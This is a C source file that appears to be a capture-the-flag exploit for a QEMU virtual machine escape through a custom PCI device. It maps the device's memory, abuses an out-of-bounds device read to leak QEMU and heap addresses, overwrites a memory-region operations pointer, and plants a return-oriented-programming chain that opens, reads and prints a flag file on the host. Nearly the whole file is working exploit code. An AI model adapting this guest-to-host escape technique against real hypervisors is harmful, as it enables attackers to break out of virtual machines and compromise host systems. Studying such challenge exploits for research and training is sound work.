#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#include <sys/mman.h>
#include <sys/types.h>

#define true 1
#define false 0

// Address of the mmio region in physical memory
#define MMIO_PHYSADDR 0xfebd0000
#define MMIO_DELETE_PHYSADDR (MMIO_PHYSADDR + offsetof(struct mmio, delete_req))
#define MMIO_SIZE 0x10000
#define DEV_PATH "/sys/devices/pci0000:00/0000:00:05.0/resource0"
#define PAGE_SZ 0x1000

volatile int result;

typedef struct {
    uint32_t op;
    uint32_t src;
    uint32_t off;
} mmio_t;

struct tcache {
    uint16_t counts[64];
    uint64_t entries[64];
};

static void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

static void hexdump8(uint64_t* buf, int len)
{
    assert(len % 0x8 == 0);
    for (int i = 1; i <= len / 8; i++) {
        printf("0x%016llx ", buf[i-1]);
        if (i % 0x2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
static uint64_t virt2phys(void* p, int has_to_be_present)
{
    uint64_t virt = (uint64_t)p;
    uint32_t saved_offset = virt & 0xfff;
    virt -= saved_offset;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1) {
        errExit("open");
    }

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8) {
        errExit("read");
    }

    // Assert page present
    assert((!has_to_be_present) || phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys + saved_offset;
}

#define TRIGGER 0x0

// read in our buffer
static uint32_t maria_read(mmio_t* mmio, uint32_t src, uint8_t off)
{
    mmio->src = src;
    mmio->off = off;
    return mmio->op;
}

// write buffer to us
static uint32_t maria_write(mmio_t* mmio, uint32_t src, uint8_t off) {
    mmio->src = src;
    mmio->off = off;
    mmio->op = TRIGGER;
}

void *
alloc_workbuf(size_t size)
{
    int ret;
    void* ptr = aligned_alloc(PAGE_SZ, size);

    /* return NULL on failure */
    if (ptr == NULL) {
        errExit("posix_memalign");
    }

    /* lock this buffer into RAM */
    ret = mlock(ptr, size);
    if (ret < 0) {
        errExit("mlock");
    }
    return ptr;
}

typedef struct {
    uint64_t read_fp;
    uint64_t write_fp;
    uint64_t read_with_attrs_fp;
    uint64_t write_with_attrs_fp;
    int endianness;
    struct {
        unsigned min_access_size;
        unsigned max_access_size;
         bool unaligned;
        uint64_t accepts_fp;
    } valid;
    struct {
        unsigned min_access_size;
        unsigned max_access_size;
        bool unaligned;
    } impl;

} mem_reg_ops_t;

int main(void)
{
    int fd = open(DEV_PATH, O_RDWR | O_SYNC);
    int ret;

    if (fd < 0) {
        errExit("open dev");
    }

    mmio_t *mmio = mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE,
                                      MAP_SHARED, fd, 0);

    if (mmio == MAP_FAILED) {
        errExit("mmio mmap");
    }

    char *buf = alloc_workbuf(0x1000);

    uint64_t addr = virt2phys(buf, true);
    printf("phys addr: %p\n", addr);

    memset(buf, 0x0, 0x20);

    // -0x1000 to account for the fact that our buffer is only 0x1000 bytes big
    ret = maria_read(mmio, addr - 0x1000, 88);

    uint64_t* p_buf = (uint64_t*)(buf+ 0x1000-88);
    uint64_t qemu_leak = p_buf[0x48/ 8];
    // opaque = first param to mmio funcs
    uint64_t opaque = p_buf[0x50 / 8];
    uint64_t system_plt = qemu_leak - 0xc13ee0;
    uint64_t execv_plt = qemu_leak - 0xc14620;
    uint64_t qemu_base = qemu_leak -0xf1ff80;

    uint64_t pop_rdi_ret = qemu_base + 0x632c5d;
    uint64_t pop_rsi_ret = qemu_base + 0x4d4db3;
    uint64_t pop_rdx_ret = qemu_base + 0x47f5c8;

    uint64_t read_plt = qemu_base + 0x30d460;
    uint64_t open_plt = qemu_base + 0x30a270;
    uint64_t write_plt = qemu_base + 0x30dc70;
    uint64_t nop = qemu_base + 0x30601a;

    uint64_t xchg_rsi_rax = qemu_base + 0x9a6176;

    uint64_t push_rdi_pop_rbp = qemu_base + 0x8e7014;

    memcpy(buf, "/home/h0ps/flag", strlen("/home/h0ps/flag"));
    uint64_t str_loc = opaque + 0x1a88;

    // corrupt ops ptr, point it to our fake ops
    p_buf[0x48 / 8] = opaque + 0x1a88 + 0x20;
    // corrupt opaque member
    // -0x8 due to rbp pop
    p_buf[0x50 / 8] = opaque + 0x1a88 + 0x20 + sizeof(mem_reg_ops_t) - 0x8;

    p_buf = (uint64_t*)buf;
    uint64_t off = 0x20 / 8;

    mem_reg_ops_t *ops = (mem_reg_ops_t*)&p_buf[off];
    ops->valid.accepts_fp = push_rdi_pop_rbp;

    off += sizeof(mem_reg_ops_t) / sizeof(uint64_t);

    p_buf[off++] = pop_rdi_ret;
    p_buf[off++] = str_loc;
    p_buf[off++] = pop_rsi_ret;
    p_buf[off++] = 0x0;
    p_buf[off++] = pop_rdx_ret;
    p_buf[off++] = 0x0;
    p_buf[off++] = open_plt;

    p_buf[off++] = pop_rdi_ret;
    p_buf[off++] = 0xc;
    p_buf[off++] = pop_rsi_ret;
    p_buf[off++] = str_loc;
    p_buf[off++] = pop_rdx_ret;
    p_buf[off++] = 0x40;
    p_buf[off++] = read_plt;

    p_buf[off++] = pop_rdi_ret;
    p_buf[off++] = 0x1;
    p_buf[off++] = pop_rsi_ret;
    p_buf[off++] = str_loc;
    p_buf[off++] = pop_rdx_ret;
    p_buf[off++] = 0x40;
    p_buf[off++] = write_plt;

    p_buf[off++] = 0x424242;

    maria_write(mmio, addr - 0x1000, 88);

    printf("Fake stack: %p \n", opaque + 0x1a88+0x10);
    printf("qemu_leak: %p \n", qemu_leak);
    printf("system: %p \n", system_plt);
    printf("Opaqque: %p \n", opaque);
    printf("/bin/sh: %p \n", opaque+0x1a88);
    //hexdump8(p_buf, 0x80);

    //WAIT();
    // trigger chain
    ret = maria_read(mmio, 0x414141, 0x424242);


    return 0;
}

